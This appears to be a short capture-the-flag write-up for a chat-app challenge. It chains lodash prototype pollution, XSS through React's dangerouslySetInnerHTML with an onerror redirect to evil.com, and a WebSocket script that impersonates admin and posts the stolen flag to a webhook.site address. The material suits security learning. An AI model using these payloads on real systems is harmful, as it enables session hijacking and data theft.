# Chatting

exploit approach:
+ websocket hijacking
+ prototype pollution
+ dangerous html xss
+ special characters filter bypass
+ backend source? & react sourcemap

### Details

websocket hijacking
+ flag bot
+ only admin can talk to the flag bot
+ forge admin to let the flag bot send a flag

xss
+ dangerous html
+ template render
+ match `>`, tag cannot be enclosed


prototype pollution
+ lodash

### Exp

prototype pollution payload:
```js
content: {
    type: 'tpl',
    data: {
        tpl: '<h3>{{b}}</h3>',
        ctx: '{"a":123, "b":123, "__proto__":{"allowImage":true}}'
    }
}
```

xss payload:
```js
content: {
    type: 'image',
    data: {
        src: 'https://i.picsum.photos/id/220/200/200.jpg?hmac=1eed0JUIOlpc-iGslem_jB1FORVXUdRtOmgpHxDDKZQ',
        attrs: {
            wow: 1,
            dangerouslySetInnerHTML: {
                __html: "<img onerror='location.href=`http://evil.com`' src=1>"
            }
        }
    }
}
```

websocket:

```javascript
const webhook = 'https://webhook.site/35fe2e36-7d32-4001-a5a4-497016b9cdc6'
const ws = new WebSocket('ws://localhost:8081')
ws.onopen = () => {
    fetch(webhook, { method: "POST", body: "open" })
}
ws.onmessage = (e) => {
    const msg = JSON.parse(e.data)
    if(msg.api == 'login'){
        ws.send(JSON.stringify({ 
            api: "login", 
            username: "admin"
        }))
        ws.send(JSON.stringify({
            api: "getflag",
        }))
    }else if(msg.api == 'flag'){
        fetch(webhook, {
            method: 'post',
            body: msg.flag
        })
    }
}
```
